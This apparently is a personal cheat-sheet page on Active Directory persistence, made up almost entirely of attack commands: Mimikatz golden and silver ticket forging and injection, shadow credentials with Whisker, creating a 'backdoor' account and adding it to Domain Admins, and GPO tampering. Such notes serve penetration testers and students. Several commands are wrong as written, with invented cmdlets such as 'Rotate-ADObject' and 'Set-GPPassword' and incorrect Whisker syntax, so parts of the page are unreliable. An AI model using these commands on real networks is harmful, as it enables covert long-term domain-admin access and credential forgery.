---
layout: notes
permalink: /notes/ad/persist/
title: Active Directory Persistence
---

# Active Directory Persistence

## Golden Ticket
```powershell
# Generate Golden Ticket
mimikatz.exe "kerberos::golden /admin:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash>"

# Inject ticket
mimikatz.exe "kerberos::ptt <ticket.kirbi>"

# Verify access
klist
```

## Silver Ticket
```powershell
# Generate Silver Ticket
mimikatz.exe "kerberos::silver /service:HTTP /target:<target> /sid:<sid> /rc4:<hash>"

# Inject ticket
mimikatz.exe "kerberos::ptt <ticket.kirbi>"

# Test service access
curl -k https://<target>
```

## Shadow Credentials
```powershell
# Add shadow credentials
Whisker.exe -u <user> -d <domain> -p <password>

# Rotate credentials
Rotate-ADObject -Identity <user>

# Verify
Get-ADUser -Identity <user> -Properties msDS-KeyCredentialLink
```

## AD Backdoors
```powershell
# Add backdoor user
net user backdoor P@ssw0rd /add /domain

# Add to admin group
net group "Domain Admins" backdoor /add /domain

# Modify GPO for persistence
Set-GPPassword -Password "NewPass" -Context <OU>
```

## Tools
- Mimikatz: ```mimikatz.exe "kerberos::golden"```
- Whisker: ```Whisker.exe -u <user> -d <domain>```
- PowerView: ```Import-Module .\PowerView.ps1; Add-NetUser```
- BloodHound: ```bloodhound-python -u <user> -p <pass> -d <domain>```
- ADModule: ```Set-ADUser -Identity <user> -Enabled $true```